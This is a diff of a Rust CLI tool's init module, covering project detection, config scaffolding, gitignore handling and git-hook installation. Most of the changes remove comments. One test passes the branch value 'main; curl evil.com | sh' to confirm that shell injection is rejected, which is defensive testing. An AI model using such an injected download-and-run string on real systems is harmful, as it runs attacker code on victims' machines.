@@ -6,8 +6,6 @@ use fallow_core::git_env::clear_ambient_git_env;
 
 use crate::validate;
 
-// ── Project detection ──────────────────────────────────────────────
-
 /// Detected project characteristics used to tailor config scaffolding.
 pub struct ProjectInfo {
     pub is_monorepo: bool,
@@ -27,7 +25,6 @@ pub fn detect_project(root: &Path) -> ProjectInfo {
 
     let pkg = PackageJson::load(&root.join("package.json")).ok();
 
-    // Workspace detection
     let pkg_workspace_patterns = pkg
         .as_ref()
         .map(|p| p.workspace_patterns())
@@ -36,8 +33,6 @@ pub fn detect_project(root: &Path) -> ProjectInfo {
 
     let is_monorepo = is_pnpm || has_npm_workspaces;
     let workspace_patterns = if is_pnpm && pkg_workspace_patterns.is_empty() {
-        // pnpm-workspace.yaml exists but no patterns in package.json;
-        // read pnpm-workspace.yaml directly for patterns.
         read_pnpm_workspace_patterns(root)
     } else {
         pkg_workspace_patterns
@@ -46,7 +41,6 @@ pub fn detect_project(root: &Path) -> ProjectInfo {
     let workspace_tool = if is_pnpm {
         Some("pnpm".to_string())
     } else if has_npm_workspaces {
-        // Distinguish yarn vs npm by lockfile presence
         if root.join("yarn.lock").exists() {
             Some("yarn".to_string())
         } else {
@@ -56,7 +50,6 @@ pub fn detect_project(root: &Path) -> ProjectInfo {
         None
     };
 
-    // Dependency scanning
     let all_deps = pkg
         .as_ref()
         .map(PackageJson::all_dependency_names)
@@ -101,7 +94,6 @@ fn read_pnpm_workspace_patterns(root: &Path) -> Vec<String> {
     let Ok(content) = std::fs::read_to_string(&path) else {
         return Vec::new();
     };
-    // Simple YAML parsing: extract lines under `packages:` that start with `- `
     let mut patterns = Vec::new();
     let mut in_packages = false;
     for line in content.lines() {
@@ -117,7 +109,6 @@ fn read_pnpm_workspace_patterns(root: &Path) -> Vec<String> {
                     patterns.push(value.to_string());
                 }
             } else if !trimmed.is_empty() && !trimmed.starts_with('#') {
-                // No longer under `packages:` key
                 break;
             }
         }
@@ -191,9 +182,6 @@ fn add_json_rules_config(config: &mut serde_json::Value, info: &ProjectInfo) {
 }
 
 fn insert_json_duplicates_template(output: &mut String) {
-    // `minOccurrences` has no trailing comma so the file remains valid JSON
-    // even after the JSONC comment lines are stripped (only one non-commented
-    // field exists today, so a trailing comma would dangle before `}`).
     *output = output.replacen(
         "  \"rules\":",
         "  \"duplicates\": {\n    // Hide pair-only clones; focus on widespread copy-paste\n    // worth refactoring. Lower to 2 to report every duplicate pair.\n    \"minOccurrences\": 3\n    // Common additions (uncomment to enable):\n    // \"ignore\": [\n    //   \"**/lib/**\",          // for repos that publish transpiled output to lib/\n    //   \"**/legacy/**\",       // for repos with legacy-build artifacts\n    //   \"**/__generated__/**\", // Relay, GraphQL Code Generator\n    //   \"**/generated/**\"     // OpenAPI, Protobuf codegen\n    // ]\n  },\n  \"rules\":",
@@ -209,7 +197,6 @@ fn build_toml_config(info: &ProjectInfo) -> String {
         String::new(),
     ];
 
-    // Entry patterns
     let extensions = if info.has_typescript {
         "{ts,tsx,js,jsx}"
     } else {
@@ -219,14 +206,12 @@ fn build_toml_config(info: &ProjectInfo) -> String {
         "entry = [\"src/index.{extensions}\", \"src/main.{extensions}\"]"
     ));
 
-    // Ignore patterns
     if info.has_storybook {
         lines.push("ignorePatterns = [\".storybook/**\"]".to_string());
     }
 
     lines.push(String::new());
 
-    // Workspace patterns
     if info.is_monorepo && !info.workspace_patterns.is_empty() {
         lines.push("[workspaces]".to_string());
         let patterns_str: Vec<String> = info
@@ -238,7 +223,6 @@ fn build_toml_config(info: &ProjectInfo) -> String {
         lines.push(String::new());
     }
 
-    // Duplicates
     lines.push("[duplicates]".to_string());
     lines.push(
         "# Hide pair-only clones; focus on widespread copy-paste worth refactoring.".to_string(),
@@ -257,7 +241,6 @@ fn build_toml_config(info: &ProjectInfo) -> String {
     lines.push("# ]".to_string());
     lines.push(String::new());
 
-    // Rules
     lines.push(
         "# Per-issue-type severity: \"error\" (fail CI), \"warn\" (report only), \"off\" (ignore)"
             .to_string(),
@@ -275,7 +258,6 @@ fn build_toml_config(info: &ProjectInfo) -> String {
 fn print_detection_summary(info: &ProjectInfo) {
     let mut detections = Vec::new();
 
-    // Project type line
     let type_label = if info.has_typescript {
         "TypeScript"
     } else {
@@ -288,7 +270,6 @@ fn print_detection_summary(info: &ProjectInfo) {
         detections.push(type_label.to_string());
     }
 
-    // Frameworks line
     let mut frameworks = Vec::new();
     if let Some(test) = &info.test_framework {
         frameworks.push(test.as_str());
@@ -307,7 +288,6 @@ fn print_detection_summary(info: &ProjectInfo) {
         eprintln!("  Detected: {detection}");
     }
 
-    // Summary of config customizations
     let mut customizations = Vec::new();
     if info.is_monorepo && !info.workspace_patterns.is_empty() {
         customizations.push("workspace patterns");
@@ -359,7 +339,6 @@ pub fn run_init(opts: &InitOptions<'_>) -> ExitCode {
 }
 
 fn run_init_config(root: &Path, use_toml: bool) -> ExitCode {
-    // Check if any config file already exists
     let existing_names = [
         ".fallowrc.json",
         ".fallowrc.jsonc",
@@ -409,7 +388,6 @@ fn ensure_gitignore(root: &Path) {
     let gitignore_path = root.join(".gitignore");
     let existing = std::fs::read_to_string(&gitignore_path).unwrap_or_default();
 
-    // Check if .fallow is already ignored (with or without trailing slash).
     let already_ignored = existing.lines().any(|line| {
         let trimmed = line.trim();
         trimmed == ".fallow" || trimmed == ".fallow/"
@@ -419,12 +397,8 @@ fn ensure_gitignore(root: &Path) {
         return;
     }
 
-    // Build the line to append.
     let is_new = existing.is_empty();
-    let entry = if is_new {
-        // New file — no leading newline needed.
-        ".fallow/\n"
-    } else if existing.ends_with('\n') {
+    let entry = if is_new || existing.ends_with('\n') {
         ".fallow/\n"
     } else {
         "\n.fallow/\n"
@@ -447,7 +421,6 @@ fn ensure_gitignore(root: &Path) {
 
 /// Detect the default branch name by querying git.
 fn detect_default_branch(root: &Path) -> Option<String> {
-    // Try `git symbolic-ref refs/remotes/origin/HEAD` first (most reliable).
     let mut command = std::process::Command::new("git");
     command
         .args(["symbolic-ref", "refs/remotes/origin/HEAD"])
@@ -505,7 +478,6 @@ fn lefthook_hint(fallback_base_ref: &str) -> String {
     )
 }
 
-// Detect hook target: husky > lefthook > simple-git-hooks > bare .git/hooks
 enum HookTarget {
     Husky(std::path::PathBuf),
     Lefthook,
@@ -535,7 +507,6 @@ pub fn run_git_hooks_install(opts: &GitHooksInstallOptions<'_>) -> ExitCode {
     let root = opts.root;
     let branch = opts.branch;
 
-    // Validate --branch to prevent shell injection in the generated hook script.
     if let Some(b) = branch
         && let Err(e) = validate::validate_git_ref(b)
     {
@@ -543,8 +514,6 @@ pub fn run_git_hooks_install(opts: &GitHooksInstallOptions<'_>) -> ExitCode {
         return ExitCode::from(2);
     }
 
-    // Determine the fallback base ref: explicit --branch > detected default branch > "main".
-    // The generated hook still prefers the current branch's upstream at execution time.
     let fallback_base_ref = branch
         .map(String::from)
         .or_else(|| detect_default_branch(root))
@@ -890,13 +859,10 @@ mod tests {
     fn init_existing_config_blocks_both_formats() {
         let dir = tempfile::tempdir().unwrap();
         let root = dir.path();
-        // Existing .fallowrc.json should block both JSON and TOML creation
         std::fs::write(root.join(".fallowrc.json"), "{}").unwrap();
         assert_eq!(run_init(&config_opts(root, false)), ExitCode::from(2));
         assert_eq!(run_init(&config_opts(root, true)), ExitCode::from(2));
     }
-
-    // ── Hook tests ─────────────────────────────────────────────────
 
     #[test]
     fn hooks_fails_without_git_dir() {
@@ -924,7 +890,6 @@ mod tests {
         assert!(content.contains("BASE=\"main\""));
         assert!(content.contains("command -v fallow"));
         assert!(content.contains("gate=new-only"));
-        // Indentation preserved: the `if` body is indented under the conditional.
         assert!(content.contains("\n  BASE=\""));
     }
 
@@ -952,7 +917,6 @@ mod tests {
         let husky_hook = root.join(".husky/pre-commit");
         assert!(husky_hook.exists());
         assert!(!root.join(".git/hooks/pre-commit").exists());
-        // Same template flows through husky path: upstream + merge-base block + marker.
         let content = std::fs::read_to_string(&husky_hook).unwrap();
         assert!(content.contains(GIT_HOOK_MARKER));
         assert!(content.contains("@{upstream}"));
@@ -1064,7 +1028,6 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         let root = dir.path();
         std::fs::write(root.join("lefthook.yml"), "").unwrap();
-        // lefthook mode prints instructions and succeeds without writing a file
         let exit = run_init(&hooks_opts(root, None));
         assert_eq!(exit, ExitCode::SUCCESS);
     }
@@ -1092,11 +1055,8 @@ mod tests {
         std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
         let exit = run_init(&hooks_opts(root, Some("main; curl evil.com | sh")));
         assert_eq!(exit, ExitCode::from(2));
-        // Hook file should NOT have been written
         assert!(!root.join(".git/hooks/pre-commit").exists());
     }
-
-    // ── Gitignore tests ────────────────────────────────────────────
 
     #[test]
     fn init_creates_gitignore_with_fallow_entry() {
@@ -1135,7 +1095,6 @@ mod tests {
         std::fs::write(root.join(".gitignore"), ".fallow\n").unwrap();
         run_init(&config_opts(root, false));
         let content = std::fs::read_to_string(root.join(".gitignore")).unwrap();
-        // Should not add a duplicate — .fallow already covers the directory
         assert_eq!(content.matches(".fallow").count(), 1);
     }
 
@@ -1157,8 +1116,6 @@ mod tests {
         let content = std::fs::read_to_string(root.join(".gitignore")).unwrap();
         assert!(content.contains(".fallow/"));
     }
-
-    // ── Project detection tests ────────────────────────────────────
 
     #[test]
     fn detect_empty_project() {
@@ -1300,8 +1257,6 @@ mod tests {
         assert_eq!(info.test_framework.as_deref(), Some("Playwright"));
     }
 
-    // ── Config generation tests ────────────────────────────────────
-
     #[test]
     fn json_config_empty_project_is_valid() {
         let info = ProjectInfo {
@@ -1319,7 +1274,6 @@ mod tests {
         assert!(parsed["entry"].is_array());
         assert!(parsed["duplicates"].is_object());
         assert!(parsed["rules"].is_object());
-        // JS extensions for non-TS project
         assert!(json.contains("{js,jsx,mjs}"));
     }
 
@@ -1495,11 +1449,6 @@ mod config_schema_drift {
     #[test]
     fn schema_json_in_sync_with_derived() {
         let derived = FallowConfig::json_schema();
-        // `FallowConfig::json_schema()` wraps `serde_json::to_value(...)` with
-        // an `unwrap_or_default()`. If schemars ever produces a value that
-        // serde_json refuses to convert, the live CLI silently emits `null`
-        // and an unguarded `assert_eq!` between two `null`s would pass. Guard
-        // against that whole class of silent regression before comparing.
         assert!(
             derived.is_object(),
             "FallowConfig::json_schema() did not produce a JSON object (got `{derived}`); \
